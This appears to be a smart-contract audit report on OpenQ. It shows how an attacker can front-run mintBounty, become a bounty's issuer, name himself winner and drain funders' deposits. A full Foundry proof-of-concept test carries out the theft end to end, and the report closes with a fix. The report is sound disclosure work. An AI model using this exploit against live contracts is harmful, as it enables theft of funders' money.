0xdeadbeef

high

# Attacker can prevent issuers from minting a bounty by creating one before them and steal funders funds.

## Summary

Anyone can call `OpenQV1` to mint a bounty.
By design only one bounty can be created for a bounty ID. 

Therefore, an attacker can front-run the call to mint a bounty with the same parameters as become the issuer. 
The bounty will still appear in the OpenQ platform (due to event handling in subgraph) and funders will be able to fund a fake bounty.

Since the issuer is the attacker
1. Real issuer will not be able to mint a bounty, they will have to create a new github issue
2. Attacker can steal the funds from the funders by issuing claims to himself. 

## Vulnerability Detail

`mintBounty` function in `OpenQV1` can be called by anyone:
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/OpenQ/Implementations/OpenQV1.sol#L26-L58

Therefore, if an attacker calls a `mintBounty` with the issue (bounty ID) before the real minter - it will succeed and the attacker will become the issuer. 

There is no validation that the caller is indeed the owner of the issue (bounty ID).

After the bounty is funded (could be funded by other organizations that planned to fund the real issue) 
The attacker (which is the issuer) can call `setTierWinner` on the tiered bounty to himself, and then call `permissionedClaimTieredBounty` in the `ClaimManager`

## Impact

1. Real issuer will not be able to mint a bounty, he will have to create a new github issue
2. Attacker can steal the funds from the funders by issuing himself as a winner. 
3. Confusion and corruption of data in the OpenQ platform

## Code Snippet

I created a foundry POC that demonstrate end to end scenario and explains the entire flow.
To get it running, first install foundry using the following command:
1. `curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)
4. If local node is not already running and contracts are not deployed, configured and funded - execute the following:
```bash
yarn deploy-contracts:localhost
yarn configure-whitelist:localhost
yarn deploy-bounties:localhost
```
3 Perform the following set of commands from the repository root.
```bash
rm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit; cp -r ../contracts ./src/; forge install openzeppelin/openzeppelin-contracts --no-commit; forge install openzeppelin/openzeppelin-contracts-upgradeable --no-commit; echo "@openzeppelin/contracts=lib/openzeppelin-contracts/contracts/\n@openzeppelin/contracts-upgradeable=lib/openzeppelin-contracts-upgradeable/contracts/" > remappings.txt
```
5. Add the following to `foundry/test/PreventBountyMintingAndStealFunds.t.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {OpenQV1} from "../src/contracts/OpenQ/Implementations/OpenQV1.sol";
import {ClaimManagerV1} from "../src/contracts/ClaimManager/Implementations/ClaimManagerV1.sol";
import {DepositManagerV1} from "../src/contracts/DepositManager/Implementations/DepositManagerV1.sol";
import {BountyCore} from "../src/contracts/Bounty/Implementations/BountyCore.sol";
import {OpenQDefinitions} from '../src/contracts/Library/OpenQDefinitions.sol';

contract PreventBountyMintingAndStealFunds is Test {
    // Addresses of contracts
    OpenQV1 OPENQ = OpenQV1(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707);
    ClaimManagerV1 CLAIM_MANAGER = ClaimManagerV1(0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6);
    DepositManagerV1 DEPOSIT_MANAGER = DepositManagerV1(0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e);
    
    // Fixed Tiered Bounty 
    BountyCore bountyAddress;

    // Oracle
    address oracle;

    function setUp() public {
        oracle = CLAIM_MANAGER.oracle();
    }

    function fundBountyToken(uint256 amount, uint256 expire, address token) public {
        DEPOSIT_MANAGER.fundBountyToken{value: amount}(
        address(bountyAddress),
        token, 
        amount,
        expire,
        string(abi.encodePacked(msg.sender)) // Unique for every funder
        );
    }

    function test_preventBountyMintingAndStealFunds() public {
        address legit_minter = address(0x1337);
        address hackathon_sponsor = address(0x1111);
        vm.deal(hackathon_sponsor, 10 ether);
        address attacker = address(0x666);

        string memory issueId = "BountyID";

        // create data for minting
        uint256[] memory tiersPayout = new uint256[](2);
        tiersPayout[0] = uint256(10 ether);
        tiersPayout[1] = uint256(0);
        bytes memory data = abi.encode(tiersPayout, address(0x0), false, false, false, "issuerID", "", "");
        OpenQDefinitions.InitOperation memory operationData = OpenQDefinitions.InitOperation(OpenQDefinitions.TIERED_FIXED, data);

        // Attacker front-runs legit_minter and issues a bounty. He will be the issuer
        vm.prank(attacker);
        bountyAddress = BountyCore(OPENQ.mintBounty(issueId, "Awesome ORG", operationData));

        // Legit minter will attempt to mint bounty but will revert because already exists
        vm.prank(legit_minter);
        vm.expectRevert("BOUNTY_ALREADY_EXISTS");
        OPENQ.mintBounty(issueId, "Awesome ORG", operationData);

        // Validate that the attacker is the BountyID issuer
        // At this point, seems like a bounty was generated for the issue
        assertEq(BountyCore(OPENQ.bountyIdToAddress(issueId)).issuer(), attacker);

        /////////// STEAL FUNDS SCENARIO //////////

        // Sponsor funds the bounty  
        vm.prank(hackathon_sponsor);
        fundBountyToken(10 ether, 1000, address(0x0));

        // Attacker will associate his address by registering to openQ
        vm.prank(oracle);
        OPENQ.associateExternalIdToAddress("AttackerID", attacker);

        // Attacker will set himself as a winner 
        vm.prank(attacker);
        OPENQ.setTierWinner(issueId, 0, "AttackerID");

        bytes memory closerData = abi.encode(address(0x0), "dummy", address(0x0), "dummy", 0);
        // Attacker will cash out the bounty
        vm.prank(attacker);
        CLAIM_MANAGER.permissionedClaimTieredBounty(address(bountyAddress), closerData);

        // Validate attacker received all the 10 ether
        assertEq(attacker.balance, 10 ether);
    }
}
```
6. Execute `forge test -m test_preventBountyMintingAndStealFunds --fork-url=http://127.0.0.1:8545 `

## Tool used

VS Code, Foundry
Manual Review

## Recommendation

The main issues here is that there is a trust that anyone can mint bounties while OpenQ expects only issuers related to github issue to mint bounties.

Therefore, it could make sense to put the `mintBounty` behind an `onlyOracle` modifier. The oracle should make sure validate that the caller is the real owner of the issue (like it does for association) 

